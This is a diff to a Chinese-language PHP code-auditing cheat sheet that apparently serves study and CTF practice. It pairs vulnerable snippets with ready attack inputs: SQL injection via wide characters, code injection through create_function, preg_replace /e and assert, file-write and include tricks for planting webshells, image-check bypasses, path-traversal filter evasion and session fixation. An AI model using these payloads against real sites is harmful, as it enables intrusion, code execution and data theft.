@@ -1,7 +1,5 @@
 # PHP代码审计
-```
-http://localhost/phpbugs/
-```
+
 ## 变量覆盖
 ### extract()
 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。
@@ -15,6 +13,25 @@ echo "\$a = $a; \$b = $b; \$c = $c";
 # 结果：$a = Cat; $b = Dog; $c = Horse
 ```
 这里原来是$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。
+
+```php
+#?shiyan=&flag=1
+<?php
+$flag='xxx'; 
+extract($_GET);
+ if(isset($shiyan))
+ { 
+    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0
+    if($shiyan==$content)
+    { 
+        echo'ctf{xxx}'; 
+    }
+   else
+   { 
+    echo'Oh.no';
+   } 
+   }
+```
 
 ### parse_str()
 解析字符串并注册成变量
@@ -43,27 +60,27 @@ import_request_variable("cg"， "cg_");
 
 ```
 
+### 全局变量覆盖漏洞
+原理：
+register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。
+如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.
 
-### 案例
+$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。
+
 ```php
-#?shiyan=&flag=1
 <?php
-$flag='xxx'; 
-extract($_GET);
- if(isset($shiyan))
- { 
-    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0
-    if($shiyan==$content)
-    { 
-        echo'ctf{xxx}'; 
-    }
-   else
-   { 
-    echo'Oh.no';
-   } 
-   }
-?>
+// register_globals =ON
+//foo.php?GLOBALS[foobar]=HELLO
+echo $foobar;
+
+//为了安全取消全局变量
+//var.php?GLOBALS[a]=aaaa&b=111
+if (ini_get("register_globals")) foreach($_REQUEST as $k=>$v) unset(${$k});
+print $a;
+print $_GET[b]; 
 ```
+经过测试，开了register_globals会卡死
+
 
 ## 绕过过滤的空白字符
 
@@ -165,9 +182,15 @@ print_r($token);
 
 ## 截断
 
-### iconv 可用chr(128)截断
+### iconv 异常字符截断
 
+```php
+## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。
+## 这里chr(128)到chr(255)都可以截断。
+$a='1'.char(130).'2';
+echo iconv("UTF-8","gbk",$a); //将字符串的编码从UTF-8转到gbk
 echo iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8
+```
 
 ### eregi、ereg可用%00截断
 
@@ -588,7 +611,490 @@ echo $g;
 ?>
 ```
 
+## 文件包含
 
+原理：
+
+include()/include_once()，require()/require_once()，中的变量可控
+
+利用过程：
+```
+上传图片（含有php代码的图片） 
+读文件，读php文件 
+包含日志文件getshell 
+包含/proc/self/envion文件getshell 
+如果有phpinfo可以包含临时文件 
+包含data://或php://input等伪协议（需要allow_url_include=On)
+```
+
+封闭协议：
+```
+file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+```
+
+
+```php
+## 访问共享目录
+include ('\evilservershell.php');
+```
+
+
+## 提交参数无过滤
+
+原理:过滤了GPC，但没有过滤其它部分。
+
+```bash
+上传文件相关变量如$_FIle
+$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST
+HTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响
+$_HTTP_COOKIE_VARS
+$_HTTP_ENV_VARS
+$_HTTP_GET_VARS
+$_HTTP_POST_FILES
+$_HTTP_POST_VARS
+$_HTTP_SERVER_VARS
+```
+
+案例：
+```php
+foreach($_COOKIE AS $_key=>$_value){
+	unset($$_key);
+}
+foreach($_POST AS $_key=>$_value){
+	!ereg("^\_[A-Z]+",$_key) && $$_key=$_POST[$_key];
+}
+foreach($_GET AS $_key=>$_value){
+	!ereg("^\_[A-Z]+",$_key) && $$_key=$_GET[$_key];
+}
+```
+通过表单来传值。
+```html
+<form method="post" action="http://localhost/qibo/member/comment.php?job=ifcom" enctype="multipart/form-data">
+<input type="file" name="cidDB">  
+<input type="submit">
+</form>
+```
+这里的gid为查询参数
+```php
+$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响
+QUERY_STRING             //用户GET方法提交时的查询字符串
+HTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多
+HTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得
+HTTP_HOST                //提交的主机头等内容
+HTTP_X_FORWARDED_FOR     //用户的代理主机的信息
+```
+
+## 伪造IP
+原理:
+以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。
+```php
+关键字：
+HTTP_
+getenv
+$_SERVER
+服务端：
+echo getenv('HTTP_CLIENT_IP');
+echo $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP
+echo $_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）
+echo $_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）
+客户端：
+注意发送的格式：
+CLIENT-IP:10.10.10.1
+X-FORWARDED-FOR:10.10.10.10
+```
+
+```
+这个玩意恒成立的。不管有没有clientip
+【strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')】
+```
+
+
+## 绕过正则匹配
+
+
+### 缺少^和$限定
+
+
+### 数组绕过正则
+
+【\A[ _a-zA-Z0-9]+\z】
+
+
+### str_replace路径穿越
+原理
+str_replace的过滤方式为其search参数数组从左到右一个一个过滤。
+
+```php
+## 这里可以被绕过，因为是对.和/或\的组合的过滤，所以单独的..或\/没有检测到。
+## 方法1
+## 五个点加///
+## 方法2
+## ...././/
+$dir = str_replace(array('..\\', '../', './', '.\\'), '', trim($dir),$countb);
+echo $dir;
+echo '</br>替换数量';
+echo $countb;
+```
+
+```php
+## 这里有对单独的.进行过滤，所以无法绕过。
+$file = str_replace(array('../', '\\', '..'), array('', '/', ''), $_GET['file'],$counta);
+echo $file;
+echo '</br>替换数量';
+echo $counta;
+```
+
+
+## short_open_tag=on 短标签
+
+原理：
+当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；
+格式为：<?xxxx;?> --> <?xxx;
+```bash
+Go0s@ubuntu:~$ cat test.php
+<?="helloworld";
+Go0s@ubuntu:~$ curl 127.0.0.1/test.php
+helloworld
+```
+
+
+## file_put_contents第二个参数传入数据
+
+原理：
+```php
+file_put_contents(file,data,mode,context)
+file	必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。
+data	可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。
+```
+
+```php
+## ?filename=xiaowei.php&data[]=<?php&data[]=%0aphpinfo();
+## 这个要从burp去传，因为后面的【?】会被理解为参数而截断
+<?php
+$a = $_GET['data'];
+$file = $_GET['filename'];
+$current = file_get_contents($file);
+file_put_contents($file, $a);
+```
+
+
+## 单引号和双引号
+
+原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。
+
+```php
+# 1
+$s = "I am a 'single quote string' inside a double quote string"; 
+$s = 'I am a "double quote string" inside a single quote string'; 
+$s = "I am a 'single quote string' inside a double quote string"; 
+$s = 'I am a "double quote string" inside a single quote string';
+# 2
+$abc='I love u'; 
+echo $abc //结果是:I love u 
+echo '$abc' //结果是:$abc 
+echo "$abc" //结果是:I love u 
+# 3
+$a="${@phpinfo()}"; //可以解析出来
+<?php $a="${@phpinfo()}";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\等
+```
+
+
+### 查询语句缺少单引号
+
+```php
+"Select * from table where id=$id" # 有注入
+"Select * from table where id=".$id." limit 1" # 有注入
+"Select * from table where id='$id'" # 无注入
+"Select * from table where id='".$id."' limit 1" # 无注入
+```
+
+## 宽字符注入
+原理
+常见转码函数：
+iconv()
+mb_convert_encoding()
+addslashes
+防御：
+用mysql_real_escape_string
+
+```php
+## ?username=tom&password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+
+## %df把\给吃掉
+$pwd = addslashes($pwd);
+mysql_query("SET NAMES gbk");
+$query = "select * from user where uname='".$uname."' and pwd='".$pwd."'";
+```
+
+## 跳转无退出
+原理:
+没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。
+```php
+## 1
+$this->myclass->notice('alert("系统已安装过");window.location.href="'.site_url().'";');
+## 2
+header("location: ../index.php");
+```
+
+## 二次编码注入
+由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。
+如%2527，两次urldecode会最后变成'
+```
+base64_decode -- 对使用 MIME base64 编码的数据进行解码
+base64_encode -- 使用 MIME base64 对数据进行编码
+rawurldecode -- 对已编码的 URL 字符串进行解码
+rawurlencode -- 按照 RFC 1738 对 URL 进行编码
+urldecode -- 解码已编码的 URL 字符串
+urlencode -- 编码 URL 字符串
+unserialize/serialize
+字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等
+```
+
+## 前端可控变量填充导致XSS
+
+当html里的链接是变量时，易出现XSS。
+```html
+={#、echo、print、printf、vprintf、<%=$test%>
+img scr={#$list.link_logo#}
+```
+
+## 命令执行函数
+
+```php
+system()
+exec()
+passthru()
+pcntl_exec()
+shell_exec()
+echo `whoami`; //反引号调用shell_exec()函数
+popen()和proc_open() //不会返回结果
+array_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = "phpinfo"
+popen('whoami >>D: /2.txt', 'r'); //这样就会在D下生成一个2.txt。
+preg_replace()
+ob_start()
+array_map()
+```
+防范方法：
+使用自定义函数或函数库来替代外部命令的功能
+使用escapeshellarg 函数来处理命令参数
+使用safe_mode_exec_dir 指定可执行文件的路径
+
+### create_function
+create_function构造了一个return后面的语句为一个函数。
+```php
+#?sort_by="]);}phpinfo();/*
+#sort_function就变成了 return 1 * strnatcasecmp($a[""]);}phpinfo();/*"], $b[""]);}phpinfo();/*"]);
+#前面闭合，然后把后面的全部注释掉了。
+<?php
+$sort_by=$_GET['sort_by'];
+$sorter='strnatcasecmp';
+$databases=array('test','test');
+$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
+usort($databases, create_function('$a, $b', $sort_function));
+```
+
+
+
+### mb_ereg_replace()的/e模式
+原理
+```
+mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:
+string mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= "msr"  ] )
+当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.
+```
+
+### preg_replace /e模式执行命令
+```php
+# ?str=[phpinfo()]
+# 这里使用/e模式，所以第二个参数\\1这里可以执行。
+# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\1，执行。
+preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);
+```
+
+## 动态函数执行
+```php
+call_user_func
+call_user_func_array
+```
+
+```php
+# ?a=assert
+call_user_func($_GET['a'],$b);
+```
+
+
+## 代码执行
+```php
+assert()
+call_user_func()
+call_user_func_array()
+create_function()
+```
+
+### eval()和assert()代码执行
+
+当assert()的参数为字符串时 可执行PHP代码。
+区别：assert可以不加;，eval不可以不加;。
+```php
+eval(" phpinfo(); ");【√】 eval(" phpinfo() ");【X】
+assert(" phpinfo(); ");【√】 assert(" phpinfo() ");【√】
+```
+
+
+## 优先级绕过
+原理：
+如果运算符优先级相同，那运算符的结合方向决定了该如何运算
+http://php.net/manual/zh/language.operators.precedence.php
+
+优先级：&&/|| 大于 = 大于 AND/OR
+
+```php
+# ($test = true) and false; $test2 = (true && false);
+$test = true and false; var_dump($test);//bool(true) 
+$test2 = true && false; var_dump($test2); //bool(false)
+
+# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过
+$test3 = is_numeric("123") and is_numeric("anything false"); var_dump($test3); //bool(true)
+```
+
+## getimagesize图片判断绕过
+原理：
+当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。
+只要我们在文件头部加入GIF89a后可以上传任意后缀文件。
+
+生成小马图的方法：
+```bash
+cat image.png webshell.php > image.php
+```
+
+```php
+## 找上传点
+## 文件头部加入GIF89a
+# 1
+$file = $request->getFiles();
+# 2
+if(getimagesize($files['users']['photo']['tmp_name']))
+        {
+          move_uploaded_file($files['users']['photo']['tmp_name'], $filename);
+# 3
+$filesize = @getimagesize('/path/to/image.png');
+if ($filesize) {
+    do_upload();
+}
+```
+
+## <变*，windows findfirstfile利用
+
+原理：
+Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。
+执行过程中，字符">"被替换成"?"，字符"<"被替换成"*"，而符号"（双引号）被替换成一个"."字符。
+所以：
+1. ">"">>"可代替一个字符,"<"可以代替后缀多个字符，"<<"可以代替包括文件名和后缀多个字符。所以一般使用<<
+2. " 可以代替.
+3. 文件名第一个字符是"."的话，读取时可以忽略之
+
+| NO | Status | Function | Type of operation |
+|----|--------|----------|-------------------|
+| 1. | OK | include() | Includefile |
+| 2. | OK | include_once() | Includefile |
+| 3. | OK | require() | Includefile |
+| 4. | OK | require_once() | Include file |
+| 5. | OK | fopen() | Openfile |
+| 6. | OK | ZipArchive::open() | Archive file |
+| 7. | OK | copy() | Copyfile |
+| 8. | OK | file_get_contents() | Readfile |
+| 9. | OK | parse_ini_file() | Readfile |
+| 10. | OK | readfile() | Readfile |
+| 11. | OK | file_put_contents() | Write file |
+| 12. | OK | mkdir() | New directory creation |
+| 13. | OK | tempnam() | New file creation |
+| 14. | OK | touch() | New file creation |
+| 15. | OK | move_uploaded_file() | Move operation |
+| 16. | OK | opendiit) | Directory operation |
+| 17. | OK | readdir() | Directory operation |
+| 18. | OK | rewinddir() | Directory operation |
+| 19. | OK | closedir() | Directory operation |
+| 20. | FAIL | rename() |  Move operation |
+| 21. | FAIL | unlink() |  Delete file |
+| 22. | FAIL | rmdir()) |  Directory operation |
+
+```php
+## ?file=1<
+## ?file=1>
+## ?file=1"txt
+文件名为1.txt
+
+## ?file=1234.tx>
+## ?file=1234.<
+## ?file=1<<
+## ?file=1<<">
+## ?file=123>">
+## ?file=>>>4">
+## ?file=<<4">
+文件名为1234.txt
+
+include('shell<');  
+include('shell<<');
+include('shell.p>p'); 
+include('shell"php');
+fopen('.htacess');  //==>fopen("htacess');
+file_get_contents('C:boot.ini'); //==>  file_get_contents ('C:/boot.ini');
+file_get_contents('C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof
+file_put_contents('C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音
+```
+
+## 处理value没有处理key
+
+foreach时,addslashes对获得的value值进行处理，但没有处理key。
+
+
+## 用来目录遍历的特别函数
+
+http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094
+stat函数
+http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071
+stream_resolve_include_path函数
+http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688
+http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457
+http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453
+
+
+## 绕过GD库图片渲染
+
+[jpg_payload.zip](file/PHP代码审计_jpg_payload.zip)
+
+jpg_name.jpg是待GD处理的图片
+```
+php jpg_payload.php <jpg_name.jpg>
+```
+生成好的图片，在经过如下代码处理后，依然能保留其中的shell：
+
+```php
+<?php
+    imagecreatefromjpeg('xxxx.jpg');
+?>
+```
+
+## 会话固定
+
+```php
+if(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid
+```
+通过get方法来设置session。所以可以通过CSRF：
+
+http://xxxx/index.php?r=admin/index/index&phpsessid=f4cking123
+
+管理员点了我们就能使用此session进后台了。
 
 
 
